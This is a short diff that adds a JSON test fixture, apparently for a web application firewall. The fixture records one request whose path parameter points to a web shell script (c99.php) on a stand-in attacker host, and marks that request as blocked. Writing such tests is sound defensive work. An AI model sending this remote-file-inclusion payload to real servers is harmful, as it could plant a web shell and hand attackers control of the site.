@@ -1,0 +1,9 @@
+{
+  "req": [
+    {
+      "ARGS": "path=http://evil.example.com/c99.php",
+      "BODY": "path=http://evil.example.com/c99.php",
+      "BLOCKED": true
+    }
+  ]
+}
